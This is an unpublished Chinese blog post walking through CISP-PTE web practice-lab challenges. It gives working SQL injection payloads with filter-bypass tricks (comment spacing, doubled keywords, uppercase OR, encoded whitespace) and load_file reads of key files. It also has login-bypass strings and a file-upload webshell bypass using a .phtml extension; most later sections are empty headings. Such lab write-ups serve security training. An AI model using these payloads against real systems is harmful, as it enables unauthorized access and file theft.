---
layout: post
title: CISP-PTE Web靶场综合
subtitle: CISP-PTE Web靶场综合
date: 2025-08-13 15:42
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags: 
number headings: first-level 2, max 4, 1.1., auto
published: false
---
## 1. SQL 注入（一）

![image.png](https://img.ghostliner.top/d3eKYq.png)

![image.png](https://img.ghostliner.top/wQkD7J.png)

发现空格过滤，使用 `/**/` 

利用注释 `-- `﻿,`#`﻿无法绕过，尝试补全

使用 `id=1')and('1'='-1`﻿, ﻿`id=1')and('1'='1`﻿成功

![image.png](https://img.ghostliner.top/kOm2DU.png)

使用 `id=1')irder/**/by/**/1%23` 成功

![image.png](https://img.ghostliner.top/mY8RwS.png)

使用 order by 确认有 4 列

![image.png](https://img.ghostliner.top/H5Y4Ra.png)

确认显示位置

```sql
'
id=1')union/**/select/**/1,2,3,4,%23
```

发现 `union` 被过滤

![image.png](https://img.ghostliner.top/tKuqXi.png)

双写绕过

```sql
'
id=-1')uunionnion/**/select/**/1,2,3,4%23
```

![image.png](https://img.ghostliner.top/s3QSHq.png)

load_file 读取文件

```sql
'
id=-1')uunionnion/**/select/**/1,2,3,load_file('/var/www/html/key')%23
```

![image.png](https://img.ghostliner.top/ldixXq.png)

测试其他绕过方法

```sql
'
id=-1')%0buunionnion%0a%0c%0dselect%091,2,3,load_file('/var/www/html/key')%23
```

经测试，`%09` `%0a` `%0b` `%0c` `%0d`﻿都可行。

## 2. SQL 注入（二）

![image.png](https://img.ghostliner.top/keH0my.png)

```sql
'
id=1%') and 1=1--+
```

发现 and 被过滤

![image.png](https://img.ghostliner.top/RRBDAx.png)

使用双写绕过成功

```sql
'
id=1%') aandnd 1=-1--+
'
id=1%') aandnd 1=1--+
```

确定列数为 7 列

```sql
'
id=-1%') uunionnion select 1,2,3,4,5,6,7--+
```

确定显示位置

![image.png](https://img.ghostliner.top/tQPT9H.png)

获取 key

```sql
'
id=-1%') uunionnion select 1,2,3,load_file('/tmp/360/key'),5,6,7--+
```

![image.png](https://img.ghostliner.top/M4yka9.png)

## 3. SQL 注入（三）

![image.png](https://img.ghostliner.top/vqEBI6.png)

尝试弱密码登录失败

![image.png](https://img.ghostliner.top/ahPhW6.png)

尝试万能密码登录

```sql
password=admin' or '1'='1'--+&username=admin' or '1='1'#
```

发现 `or` 、`--+`、`#` 被过滤

![image.png](https://img.ghostliner.top/wiet7N.png)
使用双写失败，使用大写

```sql
password=12' OR '1'='1'/**&username=12' OR'1'='1'/**
```

![image.png](https://img.ghostliner.top/PxWDMA.png)

取消注释，进行补全

```sql
password=12' OR '1'='1&username=12' OR'1'='1
```

![image.png](https://img.ghostliner.top/y2nDNd.png)

## 4. SQL 注入（四）

![image.png](https://img.ghostliner.top/xK0Mzy.png)

### 4.1. 万能密码

注册用户 `admin`，提示已存在，使用万能密码（`admin'#`）登录

![image.png](https://img.ghostliner.top/rDQziE.png)

单引号登陆失败，使用双引号

![image.png](https://img.ghostliner.top/yjNjAJ.png)

双引号登录成功

![image.png](https://img.ghostliner.top/5FRCPa.png)

### 4.2. sqlmap 爆破


## 5. 文件上传（一）

![image.png](https://img.ghostliner.top/gyMsX8.png)

上传 shell.jpg，bp 拦截修改后缀

![image.png](https://img.ghostliner.top/3Qduu3.png)

上传失败，更改后缀为 `phtml`

![image.png](https://img.ghostliner.top/JBYZHm.png)

上传成功

![image.png](https://img.ghostliner.top/MMuJRO.png)

蚁剑连接成功

![image.png](https://img.ghostliner.top/3lpSuv.png)


## 6. 文件上传（二）

## 7. 文件上传（三）

## 8. 文件包含（一）

## 9. 文件包含（二）

## 10. 文件包含（三）

## 11. 命令执行（一）

## 12. 命令执行（二）

## 13. 命令执行（三）

## 14. 日志审计（一）

## 15. 日志审计（二）

## 16. 暴力破解

## 17. XSS（一）

## 18. XSS（二）

## 19. 二阶注入

- [ ] pteweb 靶场🛫 2025-08-18 